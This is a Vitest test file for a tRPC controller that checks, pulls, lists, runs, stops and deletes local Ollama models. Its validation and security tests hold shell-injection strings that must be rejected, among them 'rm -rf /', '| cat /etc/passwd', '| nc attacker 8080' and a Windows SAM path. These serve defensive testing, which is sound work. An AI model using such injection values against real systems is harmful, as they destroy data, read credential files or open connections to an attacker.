/**
 * Ollama Controller Tests
 *
 * Comprehensive tests for the Ollama tRPC controller.
 * Tests all 7 procedures: status, list, running, pull, delete, run, stop
 *
 * @module ollama.controller.test
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { TRPCError } from '@trpc/server'
import { ollamaRouter } from '../ollama.controller'

// Mock fetch globally
const mockFetch = vi.fn()
global.fetch = mockFetch

// Mock spawnAsync
vi.mock('../../../utils/spawn-async', () => ({
  spawnAsync: vi.fn(),
}))

import { spawnAsync } from '../../../utils/spawn-async'

// Create a test caller
const createTestCaller = () => ollamaRouter.createCaller({})

describe('ollama.controller', () => {
  let caller: ReturnType<typeof createTestCaller>

  beforeEach(() => {
    vi.clearAllMocks()
    caller = createTestCaller()
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  // ===========================================================================
  // STATUS PROCEDURE
  // ===========================================================================
  describe('status', () => {
    it('should return online status with version when Ollama is running', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ version: '0.1.23' }),
      })

      const result = await caller.status()

      expect(result).toEqual({ online: true, version: '0.1.23' })
      expect(mockFetch).toHaveBeenCalledWith(
        'http://localhost:11434/api/version',
        expect.objectContaining({ signal: expect.any(AbortSignal) })
      )
    })

    it('should return offline status when Ollama is not running', async () => {
      mockFetch.mockRejectedValueOnce(new Error('Connection refused'))

      const result = await caller.status()

      expect(result).toEqual({ online: false })
    })

    it('should return offline status when response is not ok', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
      })

      const result = await caller.status()

      expect(result).toEqual({ online: false })
    })

    it('should handle abort error gracefully', async () => {
      // Simulate an abort error (which is what happens on timeout)
      const abortError = new Error('Aborted')
      abortError.name = 'AbortError'
      mockFetch.mockRejectedValueOnce(abortError)

      const result = await caller.status()

      expect(result).toEqual({ online: false })
    })
  })

  // ===========================================================================
  // LIST PROCEDURE
  // ===========================================================================
  describe('list', () => {
    it('should return empty array when no models installed', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ models: [] }),
      })

      const result = await caller.list()

      expect(result).toEqual([])
      expect(mockFetch).toHaveBeenCalledWith(
        'http://localhost:11434/api/tags',
        expect.objectContaining({ signal: expect.any(AbortSignal) })
      )
    })

    it('should return model list with transformed properties', async () => {
      const mockModels = [
        {
          name: 'llama2:latest',
          size: 4500000000,
          digest: 'abc123',
          modified_at: '2024-01-15T10:00:00Z',
          details: {
            format: 'gguf',
            family: 'llama',
            parameter_size: '7B',
            quantization_level: 'Q4_0',
          },
        },
        {
          name: 'nomic-embed-text:latest',
          size: 300000000,
          digest: 'def456',
          modified_at: '2024-01-14T08:00:00Z',
        },
      ]

      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ models: mockModels }),
      })

      const result = await caller.list()

      expect(result).toHaveLength(2)
      expect(result[0]).toEqual({
        name: 'llama2:latest',
        size: 4500000000,
        digest: 'abc123',
        modifiedAt: '2024-01-15T10:00:00Z',
        details: {
          format: 'gguf',
          family: 'llama',
          parameterSize: '7B',
          quantizationLevel: 'Q4_0',
        },
      })
      expect(result[1]).toEqual({
        name: 'nomic-embed-text:latest',
        size: 300000000,
        digest: 'def456',
        modifiedAt: '2024-01-14T08:00:00Z',
        details: undefined,
      })
    })

    it('should return empty array when response is not ok', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
      })

      const result = await caller.list()

      expect(result).toEqual([])
    })

    it('should return empty array when models property is missing', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({}),
      })

      const result = await caller.list()

      expect(result).toEqual([])
    })

    it('should handle fetch error gracefully', async () => {
      mockFetch.mockRejectedValueOnce(new Error('Network error'))

      const result = await caller.list()

      expect(result).toEqual([])
    })
  })

  // ===========================================================================
  // RUNNING PROCEDURE
  // ===========================================================================
  describe('running', () => {
    it('should return empty array when no models running', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ models: [] }),
      })

      const result = await caller.running()

      expect(result).toEqual([])
      expect(mockFetch).toHaveBeenCalledWith(
        'http://localhost:11434/api/ps',
        expect.objectContaining({ signal: expect.any(AbortSignal) })
      )
    })

    it('should return running models with transformed properties', async () => {
      const mockRunningModels = [
        {
          name: 'llama2:latest',
          model: 'llama2:latest',
          size: 4500000000,
          digest: 'abc123',
          expires_at: '2024-01-15T11:00:00Z',
        },
      ]

      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ models: mockRunningModels }),
      })

      const result = await caller.running()

      expect(result).toHaveLength(1)
      expect(result[0]).toEqual({
        name: 'llama2:latest',
        model: 'llama2:latest',
        size: 4500000000,
        digest: 'abc123',
        expiresAt: '2024-01-15T11:00:00Z',
      })
    })

    it('should return empty array when response is not ok', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
      })

      const result = await caller.running()

      expect(result).toEqual([])
    })

    it('should handle fetch error gracefully', async () => {
      mockFetch.mockRejectedValueOnce(new Error('Connection refused'))

      const result = await caller.running()

      expect(result).toEqual([])
    })
  })

  // ===========================================================================
  // PULL PROCEDURE
  // ===========================================================================
  describe('pull', () => {
    it('should successfully pull a model', async () => {
      vi.mocked(spawnAsync).mockResolvedValueOnce('Pulling model...\nDone')

      const result = await caller.pull({ model: 'llama2:latest' })

      expect(result).toBe(true)
      expect(spawnAsync).toHaveBeenCalledWith('ollama', ['pull', 'llama2:latest'], {
        timeout: 600000,
      })
    })

    it('should throw when pull fails', async () => {
      vi.mocked(spawnAsync).mockRejectedValue(new Error('Pull failed'))

      await expect(caller.pull({ model: 'nonexistent:model' })).rejects.toThrow(TRPCError)
      await expect(caller.pull({ model: 'nonexistent:model' })).rejects.toMatchObject({
        code: 'INTERNAL_SERVER_ERROR',
      })
    })

    it('should reject empty model name', async () => {
      await expect(caller.pull({ model: '' })).rejects.toThrow()
    })

    it('should reject model name with invalid characters', async () => {
      await expect(caller.pull({ model: 'model; rm -rf /' })).rejects.toThrow()
      await expect(caller.pull({ model: 'model`whoami`' })).rejects.toThrow()
      await expect(caller.pull({ model: 'model$(id)' })).rejects.toThrow()
      await expect(caller.pull({ model: 'model | cat /etc/passwd' })).rejects.toThrow()
    })

    it('should accept valid model name formats', async () => {
      vi.mocked(spawnAsync).mockResolvedValue('Success')

      // Standard model name
      await expect(caller.pull({ model: 'llama2' })).resolves.toBe(true)

      // Model with tag
      await expect(caller.pull({ model: 'llama2:latest' })).resolves.toBe(true)

      // Model with version
      await expect(caller.pull({ model: 'llama2:7b' })).resolves.toBe(true)

      // Registry/model format
      await expect(caller.pull({ model: 'registry/model:tag' })).resolves.toBe(true)

      // Underscore and dash
      await expect(caller.pull({ model: 'nomic-embed-text_v1.5' })).resolves.toBe(true)
    })

    it('should reject model name exceeding 200 characters', async () => {
      const longModel = 'a'.repeat(201)
      await expect(caller.pull({ model: longModel })).rejects.toThrow()
    })

    it('should sanitize model name before execution', async () => {
      vi.mocked(spawnAsync).mockResolvedValueOnce('Done')

      // Even if validation passes, the internal function sanitizes
      await caller.pull({ model: 'llama2:latest' })

      // spawnAsync should be called with sanitized model name
      expect(spawnAsync).toHaveBeenCalledWith('ollama', ['pull', 'llama2:latest'], {
        timeout: 600000,
      })
    })
  })

  // ===========================================================================
  // DELETE PROCEDURE
  // ===========================================================================
  describe('delete', () => {
    it('should successfully delete a model', async () => {
      vi.mocked(spawnAsync).mockResolvedValueOnce('Model deleted')

      const result = await caller.delete({ model: 'llama2:latest' })

      expect(result).toBe(true)
      expect(spawnAsync).toHaveBeenCalledWith('ollama', ['rm', 'llama2:latest'], {
        timeout: 30000,
      })
    })

    it('should throw when deletion fails', async () => {
      vi.mocked(spawnAsync).mockRejectedValue(new Error('Model not found'))

      await expect(caller.delete({ model: 'nonexistent:model' })).rejects.toThrow(TRPCError)
      await expect(caller.delete({ model: 'nonexistent:model' })).rejects.toMatchObject({
        code: 'INTERNAL_SERVER_ERROR',
      })
    })

    it('should reject empty model name', async () => {
      await expect(caller.delete({ model: '' })).rejects.toThrow()
    })

    it('should reject model name with shell injection', async () => {
      await expect(caller.delete({ model: 'model; rm -rf /' })).rejects.toThrow()
    })
  })

  // ===========================================================================
  // RUN PROCEDURE
  // ===========================================================================
  describe('run', () => {
    it('should successfully load a model into memory', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({}),
      })

      const result = await caller.run({ model: 'llama2:latest' })

      expect(result).toBe(true)
      expect(mockFetch).toHaveBeenCalledWith(
        'http://localhost:11434/api/generate',
        expect.objectContaining({
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ model: 'llama2:latest', keep_alive: '10m' }),
        })
      )
    })

    it('should throw when run fails', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
      })

      await expect(caller.run({ model: 'nonexistent:model' })).rejects.toThrow(TRPCError)
      await expect(caller.run({ model: 'nonexistent:model' })).rejects.toMatchObject({
        code: 'INTERNAL_SERVER_ERROR',
      })
    })

    it('should throw on fetch error', async () => {
      mockFetch.mockRejectedValueOnce(new Error('Connection refused'))

      await expect(caller.run({ model: 'llama2:latest' })).rejects.toThrow(TRPCError)
      await expect(caller.run({ model: 'llama2:latest' })).rejects.toMatchObject({
        code: 'INTERNAL_SERVER_ERROR',
      })
    })

    it('should reject empty model name', async () => {
      await expect(caller.run({ model: '' })).rejects.toThrow()
    })

    it('should reject model name with invalid characters', async () => {
      await expect(caller.run({ model: 'model; whoami' })).rejects.toThrow()
    })
  })

  // ===========================================================================
  // STOP PROCEDURE
  // ===========================================================================
  describe('stop', () => {
    it('should successfully unload a model from memory', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({}),
      })

      const result = await caller.stop({ model: 'llama2:latest' })

      expect(result).toBe(true)
      expect(mockFetch).toHaveBeenCalledWith(
        'http://localhost:11434/api/generate',
        expect.objectContaining({
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ model: 'llama2:latest', keep_alive: 0 }),
        })
      )
    })

    it('should throw when stop fails', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
      })

      await expect(caller.stop({ model: 'llama2:latest' })).rejects.toThrow(TRPCError)
      await expect(caller.stop({ model: 'llama2:latest' })).rejects.toMatchObject({
        code: 'INTERNAL_SERVER_ERROR',
      })
    })

    it('should throw on fetch error', async () => {
      mockFetch.mockRejectedValueOnce(new Error('Connection refused'))

      await expect(caller.stop({ model: 'llama2:latest' })).rejects.toThrow(TRPCError)
      await expect(caller.stop({ model: 'llama2:latest' })).rejects.toMatchObject({
        code: 'INTERNAL_SERVER_ERROR',
      })
    })

    it('should reject empty model name', async () => {
      await expect(caller.stop({ model: '' })).rejects.toThrow()
    })
  })

  // ===========================================================================
  // SECURITY TESTS
  // ===========================================================================
  describe('security', () => {
    it('should prevent command injection in pull', async () => {
      const maliciousModels = [
        '$(whoami)',
        '`id`',
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& echo pwned',
        '\n touch /tmp/pwned',
      ]

      for (const model of maliciousModels) {
        await expect(caller.pull({ model })).rejects.toThrow()
      }
    })

    it('should prevent command injection in delete', async () => {
      const maliciousModels = ['$(id)', '`whoami`', '; ls -la', '| nc attacker 8080']

      for (const model of maliciousModels) {
        await expect(caller.delete({ model })).rejects.toThrow()
      }
    })

    it('should reject model names with backslashes (path traversal)', async () => {
      // Backslashes are not in the allowed character set
      const invalidModels = ['..\\..\\windows\\system32\\config\\sam', 'model\\name']

      for (const model of invalidModels) {
        await expect(caller.pull({ model })).rejects.toThrow()
      }
    })

    it('should allow forward slashes in model names (registry format)', async () => {
      vi.mocked(spawnAsync).mockResolvedValue('Success')

      // Forward slashes are valid for registry/model format
      // The sanitize function will still strip any dangerous characters
      await expect(caller.pull({ model: 'registry/model' })).resolves.toBe(true)
    })

    it('should sanitize model names even after validation', async () => {
      vi.mocked(spawnAsync).mockResolvedValue('Success')

      // Test that spawnAsync is called with sanitized arguments
      await caller.pull({ model: 'model-name_v1.0:latest' })

      // Verify the model name was passed safely as an array element, not shell-parsed
      expect(spawnAsync).toHaveBeenCalledWith('ollama', ['pull', 'model-name_v1.0:latest'], {
        timeout: 600000,
      })
    })
  })

  // ===========================================================================
  // EDGE CASES
  // ===========================================================================
  describe('edge cases', () => {
    it('should handle concurrent status calls', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({ version: '0.1.23' }),
      })

      const results = await Promise.all([caller.status(), caller.status(), caller.status()])

      expect(results).toHaveLength(3)
      results.forEach((result) => {
        expect(result).toEqual({ online: true, version: '0.1.23' })
      })
    })

    it('should handle concurrent list calls', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        json: () =>
          Promise.resolve({
            models: [{ name: 'llama2', size: 1000, digest: 'abc', modified_at: '2024-01-01' }],
          }),
      })

      const results = await Promise.all([caller.list(), caller.list(), caller.list()])

      expect(results).toHaveLength(3)
      results.forEach((result) => {
        expect(result).toHaveLength(1)
      })
    })

    it('should handle model name at exact max length', async () => {
      vi.mocked(spawnAsync).mockResolvedValueOnce('Success')

      const maxLengthModel = 'a'.repeat(200)
      const result = await caller.pull({ model: maxLengthModel })

      expect(result).toBe(true)
    })

    it('should handle special but valid characters in model names', async () => {
      vi.mocked(spawnAsync).mockResolvedValue('Success')

      // Valid model name patterns
      const validModels = ['llama2:7b-q4_0', 'codellama/instruct:13b', 'registry.io/model:v1.2.3']

      for (const model of validModels) {
        const result = await caller.pull({ model })
        expect(result).toBe(true)
      }
    })
  })
})
